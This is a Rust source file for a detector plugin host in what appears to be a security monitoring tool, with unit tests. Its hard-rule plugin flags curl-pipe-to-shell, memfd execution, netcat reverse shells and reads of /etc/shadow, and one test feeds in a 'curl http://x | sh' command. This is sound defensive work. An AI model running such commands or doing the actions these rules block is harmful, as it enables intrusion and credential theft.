//! Detector plugin host — static Rust plugins today, IPC for C/Go later.

use serde::{Deserialize, Serialize};

/// Verdict returned by a detector plugin.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct PluginVerdict {
    pub allow: bool,
    pub reason: String,
    pub rule_id: Option<String>,
}

/// Trait for in-process detector plugins.
pub trait DetectorPlugin: Send + Sync {
    fn name(&self) -> &str;
    fn version(&self) -> &str;
    fn evaluate(&self, event_json: &str) -> PluginVerdict;
}

/// Built-in wrapper around hard-rule pattern matching.
pub struct HardRulesPlugin;

impl DetectorPlugin for HardRulesPlugin {
    fn name(&self) -> &str {
        "jett-hard-rules"
    }

    fn version(&self) -> &str {
        "1.0.0"
    }

    fn evaluate(&self, event_json: &str) -> PluginVerdict {
        let lower = event_json.to_lowercase();
        let rules = [
            ("curl_pipe_sh", "| sh", "curl_pipe_sh"),
            ("memfd", "memfd", "memfd_create"),
            ("nc_reverse", "nc -e", "netcat_reverse_shell"),
            ("shadow_read", "/etc/shadow", "shadow_access"),
        ];
        for (id, needle, label) in rules {
            if lower.contains(needle) {
                return PluginVerdict {
                    allow: false,
                    reason: format!("hard rule: {}", label),
                    rule_id: Some(id.to_string()),
                };
            }
        }
        PluginVerdict {
            allow: true,
            reason: "no hard rule match".into(),
            rule_id: None,
        }
    }
}

/// Host for loaded detector plugins.
pub struct PluginHost {
    plugins: Vec<Box<dyn DetectorPlugin>>,
}

impl PluginHost {
    pub fn load_static() -> Self {
        Self {
            plugins: vec![Box::new(HardRulesPlugin)],
        }
    }

    pub fn plugin_count(&self) -> usize {
        self.plugins.len()
    }

    pub fn evaluate_all(&self, event_json: &str) -> Vec<(&str, PluginVerdict)> {
        self.plugins
            .iter()
            .map(|p| (p.name(), p.evaluate(event_json)))
            .collect()
    }

    /// First quarantine verdict wins; otherwise allow.
    pub fn aggregate_verdict(&self, event_json: &str) -> PluginVerdict {
        for plugin in &self.plugins {
            let v = plugin.evaluate(event_json);
            if !v.allow {
                return v;
            }
        }
        PluginVerdict {
            allow: true,
            reason: "all plugins allow".into(),
            rule_id: None,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn static_host_loads_hard_rules() {
        let host = PluginHost::load_static();
        assert_eq!(host.plugin_count(), 1);
    }

    #[test]
    fn hard_rules_quarantine_curl_pipe() {
        let host = PluginHost::load_static();
        let v = host.aggregate_verdict(r#"{"cmdline":"curl http://x | sh"}"#);
        assert!(!v.allow);
        assert_eq!(v.rule_id.as_deref(), Some("curl_pipe_sh"));
    }

    #[test]
    fn benign_event_allowed() {
        let host = PluginHost::load_static();
        let v = host.aggregate_verdict(r#"{"cmdline":"git status"}"#);
        assert!(v.allow);
    }
}
